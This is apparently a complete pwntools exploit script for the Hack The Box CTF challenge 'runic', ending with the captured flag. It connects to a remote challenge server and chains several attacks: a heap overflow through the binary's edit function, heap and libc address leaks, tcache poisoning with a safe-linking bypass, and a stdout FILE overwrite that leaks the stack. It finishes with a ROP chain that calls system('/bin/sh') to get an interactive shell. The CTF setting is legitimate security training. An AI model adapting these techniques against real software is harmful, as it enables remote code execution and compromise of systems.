#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 123 ./runic
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./runic')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '165.22.116.7'
port = int(args.PORT or 30793)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *edit+513
continue
c
c
c
c
c
b *create+330
c
c
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  '.'


libc = exe.libc
io = start()

def add(name,length,content):
    io.sendlineafter('Action: \n','1')
    io.sendafter('name: \n',str(name))
    io.sendlineafter('length: \n',str(length))
    io.sendafter('contents: \n',str(content))

def delete(name):
    io.sendlineafter('Action: \n','2')
    io.sendafter('name: \n',str(name))

def edit(name,new_name,content):
    io.sendlineafter('Action: \n','3')
    io.sendafter('name: \n',str(name))
    io.sendafter('name: \n',str(new_name))
    io.sendafter('contents: \n',str(content))

def show(name):
    io.sendlineafter('Action: \n','4')
    io.sendafter('name: \n',str(name))

pad = '\x07'*6+'\x16'
f_name = lambda x: chr(x) + pad

add(chr(0),0,'')
add(chr(1),0,'')
add(chr(63),0,'')
add(chr(62),0,'')
add(chr(8),0x60,'a')
add(chr(9),0x60,'a')

delete(chr(0))

add(chr(1)*3,0,'')

delete(chr(1))
delete(chr(62))

edit(chr(1)*3,chr(2),'a'*24) # heap overflow

show(chr(2))

io.recvuntil('Rune contents:\n\n'+'a'*24)

base_heap = u64(io.recv(5) +'\x00'*3) <<12
print hex(base_heap)

p = 'b'*16
p += p64(0x21)
p += p64(base_heap>>12)*2
p += p64(0) + p64(0x501)
edit(chr(2),chr(3),p)

for i in range(10):
    p =p64(0x21)
    p +=(p64(0)+p64(0x21))*5
    add(chr(20+i),0x60,p)

delete(chr(63))

edit(chr(3),chr(2),'a'*(8+16*3))

show(chr(2))

io.recvuntil('Rune contents:\n\n'+'a'*(8+16*3))

libc.address = u64(io.recv(6) +'\x00'*2) - 0x1f2cc0
print hex(libc.address)

p ='c'*(8)
p += p64(0)+p64(0x21)
p += p64(base_heap>>12)*2
p += p64(0)+p64(0x501)
p += p64(libc.address+0x1f2cc0)*2
p += p64(0)+p64(0x21)
p += p64((libc.address+0x1f2080)^(base_heap>>12))
edit(chr(2),chr(3),p)

add(chr(0x20),0x8,'a')

add(chr(0x50),0x50,'a')
add(chr(0x51),0x50,'a')

delete(chr(0x51))
delete(chr(0x50))

p ='c'*(8)
p += p64(0)+p64(0x21)
p += p64(base_heap>>12)*2
p += p64(0)+p64(0x61)
p += p64((libc.sym['_IO_2_1_stdout_'])^(base_heap>>12))
edit(chr(3),chr(2),p)

add(chr(0x50),0x50,'a')

p =''
p+= p64(0) # _IO_read_ptr
p+= p64(0) # _IO_read_end
p+= p64(0) # _IO_read_base
p+= p64(libc.sym['environ'])
p+= p64(libc.sym['environ']+8)
add(p64(0xfbad1887),0x50,p)

leak_stack = u64(io.recv(8)) - 0x150
print hex(leak_stack)

add(chr(0x51),0x50,'a')

delete(chr(0x51))
delete(chr(0x50))

p ='c'*(8)
p += p64(0)+p64(0x21)
p += p64(base_heap>>12)*2
p += p64(0)+p64(0x61)
p += p64((leak_stack-0x8)^(base_heap>>12))
edit(chr(2),chr(3),p)

pop_rdi = libc.address + 0x000000000002daa2
bin_sh = libc.search("/bin/sh").next()

add(chr(0x50),0x50,'a')

p =''
p += p64(pop_rdi)
p += p64(bin_sh)
p += p64(libc.sym['system']) 
add(p64(pop_rdi),0x50,p)

io.interactive()
# HTB{k1ng_0f_h4sh1n_4nd_m4st3r_0f_th3_run3s}

